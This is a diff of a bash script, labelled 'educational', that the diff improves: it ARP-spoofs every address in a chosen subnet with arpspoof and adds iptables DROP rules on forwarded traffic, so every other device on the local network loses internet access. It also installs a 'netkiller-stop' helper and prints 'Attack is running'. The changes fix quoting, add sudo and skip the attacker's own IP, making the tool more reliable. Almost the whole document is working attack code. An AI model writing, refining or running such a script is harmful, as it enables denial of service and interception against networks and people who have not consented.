@@ -1,44 +1,51 @@
 #!/bin/bash
 
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
-# Targets all possible IPs in subnet (without scanning)                                                                             # Requires: arpspoof, iptables, ipcalc
+# Targets all possible IPs in subnet (without scanning)
+# Requires: arpspoof, iptables, ipcalc
+
+set -e
+
+# Check for required programs
+for cmd in arpspoof iptables ipcalc; do
+    command -v $cmd >/dev/null 2>&1 || { echo "$cmd not found. Install it."; exit 1; }
+done
 
 echo "Enter the Network Interface (e.g., wlan0):"
-read -p "> " INTERFACE
+read -rp "> " INTERFACE
 
 echo "Enter the Router Gateway IP:"
-read -p "> " GATEWAY
+read -rp "> " GATEWAY
 
 # Detect Device IP
-echo "Enter Device IP: Enter by default"
-IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
-read -p "> $IP" DEVIP
-MYIP="${DEVIP:-$IP}"
+DEFAULT_IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -n1)
+echo "Enter Device IP (Press Enter to use $DEFAULT_IP):"
+read -rp "> " DEVIP
+MYIP="${DEVIP:-$DEFAULT_IP}"
 
 echo "Enter the target subnet (e.g., 192.168.1.1/24):"
-read -p "> " TARGET_SUBNET
+read -rp "> " TARGET_SUBNET
 
 # Enable IP forwarding
-echo 1 > /proc/sys/net/ipv4/ip_forward
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null
 
 # Flush existing rules
-iptables -F
-iptables -X
-iptables -t nat -F
-iptables -F FORWARD
+sudo iptables -F
+sudo iptables -X
+sudo iptables -t nat -F
+sudo iptables -F FORWARD || true
 
 # Create stop script
-cat > /bin/netkiller-stop << EOF
+cat << 'EOF' | sudo tee /usr/local/bin/netkiller-stop >/dev/null
 #!/bin/sh
-
 iptables -F
 iptables -X
 iptables -t nat -F
-iptables -F FORWARD
+iptables -F FORWARD || true
 pkill arpspoof
 echo "Restoring the connection..."
 EOF
-chmod 755 /bin/netkiller-stop
+sudo chmod 755 /usr/local/bin/netkiller-stop
 
 # Function to expand a subnet to individual IPs (using ipcalc)
 expand_subnet() {
@@ -48,7 +55,7 @@ expand_subnet() {
 }
 
 # Expand subnet for ARP spoofing
-read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET_SUBNET")
+read -r HOSTMIN HOSTMAX < <(expand_subnet "$TARGET_SUBNET")
 if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     # Convert IPs to integers
     ip2int() {
@@ -60,21 +67,23 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
         local ip=$1
         echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))"
     }
-    START=$(ip2int $HOSTMIN)
-    END=$(ip2int $HOSTMAX)
+    START=$(ip2int "$HOSTMIN")
+    END=$(ip2int "$HOSTMAX")
+
+    # Insert iptables rules ONCE
+    sudo iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+    sudo iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
+
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip $i)
-        (
-          # Block all the traffic except the DEVICE IP and GATEWAY
-            iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP 
-            iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP 
-            
-            # Bidirectional ARPspoofing policy 
-            arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
-            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
-        ) &
+        if [[ "$TARGET_IP" == "$MYIP" ]] || [[ "$TARGET_IP" == "$GATEWAY" ]]; then
+            continue
+        fi
+        # Bidirectional ARPspoofing policy
+        sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
+        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
     done
 fi
 
 echo "Attack is running against all possible hosts in $TARGET_SUBNET"
-echo "To stop, Type: netkiller-stop"
+echo "To stop, type: sudo netkiller-stop"
